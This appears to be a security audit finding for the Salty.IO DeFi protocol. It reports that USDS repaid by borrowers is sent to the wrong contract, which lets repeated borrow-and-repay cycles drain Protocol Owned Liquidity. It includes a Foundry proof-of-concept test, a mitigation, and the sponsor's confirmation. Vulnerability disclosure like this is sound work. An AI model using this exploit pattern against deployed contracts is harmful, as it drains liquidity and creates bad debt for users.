[H-06] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS
Submitted bynonseodion, also found byToshii,lanrebayode77,Aymen0909,KingNFT,juancito,00xSEV,fnanni,oakcobalt,chaduke,israeladelaja,Ephraim, zach (1,2),Drynooo,solmaxis69,pkqs90,wangxx2026,ether_sky,0x3b,LeoGold,Jorgect,0xAlix2,0xRobocop,0xanmol,djxploit,ayden, andklau5
When a user repays the USDS he has borrowed, it is taken from him and kept for burning. The Liquidizer contract is updated with the new amount repaid. The USDS is burnt whenever theperformUpkeepfunction is called on Liquidizer by the Upkeep contract during upkeep.
The USDS collected is sent to the USDS contract which can be burned wheneverburnTokensInContractis called. The amount of USDS to be burnt in the Liquidizer contract is also increased by theincrementBurnableUSDScall. This increases theusdsThatShouldBeBurnedvariable on the Liquidizer.
functionrepayUSDS(uint256amountRepaid)externalnonReentrant{...usds.safeTransferFrom(msg.sender,address(usds),amountRepaid);// Have USDS remember that the USDS should be burnedliquidizer.incrementBurnableUSDS(amountRepaid);...}
During upkeep, the Liquidizer first checks if it has enough USDS balance to burn i.eusdsBalance >= usdsThatShouldBeBurned. If it does it burns them else it converts Protocol Owned Liquidity (POL) to USDS and burns it to cover the deficit. Burning POL allows the protocol to cover bad debt from liquidation.
function_possiblyBurnUSDS()internal{...uint256usdsBalance=usds.balanceOf(address(this));if(usdsBalance>=usdsThatShouldBeBurned){// Burn only up to usdsThatShouldBeBurned.// Leftover USDS will be kept in this contract in case it needs to be burned later._burnUSDS(usdsThatShouldBeBurned);usdsThatShouldBeBurned=0;}else{// The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later_burnUSDS(usdsBalance);usdsThatShouldBeBurned-=usdsBalance;// As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and// send the underlying tokens here to be swapped to USDSdao.withdrawPOL(salt,usds,PERCENT_POL_TO_WITHDRAW);dao.withdrawPOL(dai,usds,PERCENT_POL_TO_WITHDRAW);}}
Since theusdsThatShouldBeBurnedvariable will always be increased without increasing the Liquidizer balance, it will always sell POL to cover the increase.
If the POL is exhausted, the protocol cannot cover bad debt generated from liquidations. This will affect the price of USDS negatively.
An attacker can borrow and repay multiple times to exhaust POL and create bad debt or it could just be done over time as users repay their USDS.
Impact
This will affect the price of USDS negatively.
Proof of Concept
This test can be run inCollateralAndLiquidity.t.sol.
functiontestBurnPOL()public{// setupvm.prank(address(collateralAndLiquidity));usds.mintTo(address(dao),20000ether);vm.prank(address(teamVestingWallet));salt.transfer(address(dao),10000ether);vm.prank(DEPLOYER);dai.transfer(address(dao),10000ether);// create Protocol Owned Liquidity (POL)vm.startPrank(address(dao));collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt,usds,10000ether,10000ether,0,block.timestamp,false);collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai,usds,10000ether,10000ether,0,block.timestamp,false);vm.stopPrank();bytes32poolIDA=PoolUtils._poolID(salt,usds);bytes32poolIDB=PoolUtils._poolID(dai,usds);assertEq(collateralAndLiquidity.userShareForPool(address(dao),poolIDA),20000ether);assertEq(collateralAndLiquidity.userShareForPool(address(dao),poolIDB),20000ether);// Alice deposits collateralvm.startPrank(address(alice));wbtc.approve(address(collateralAndLiquidity),type(uint256).max);weth.approve(address(collateralAndLiquidity),type(uint256).max);collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice),weth.balanceOf(alice),0,block.timestamp,true);// Alice performs multiple borrows and repayments, increasing the// usdsThatShouldBeBurned variable in Liquidizerfor(uinti;i<100;i++){vm.startPrank(alice);uint256maxUSDS=collateralAndLiquidity.maxBorrowableUSDS(alice);collateralAndLiquidity.borrowUSDS(maxUSDS);uint256borrowed=collateralAndLiquidity.usdsBorrowedByUsers(alice);collateralAndLiquidity.repayUSDS(borrowed);}vm.startPrank(address(upkeep));// perform upkeep multiple times to cover bad debt// breaks when POL is exhaustedfor(;;){(,uintreserve1) =pools.getPoolReserves(dai,usds);if(reserve1*99/100<100)break;liquidizer.performUpkeep();}assertGt(liquidizer.usdsThatShouldBeBurned(),usds.balanceOf(address(liquidizer)));}
Recommended Mitigation Steps
Send the repaid USDS to the Liquidizer.
othernet-global (Salty.IO) confirmed and commented:
The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
Status:Mitigation confirmed. Full details in reports from0xpiken,zzebra83, andt0x1c.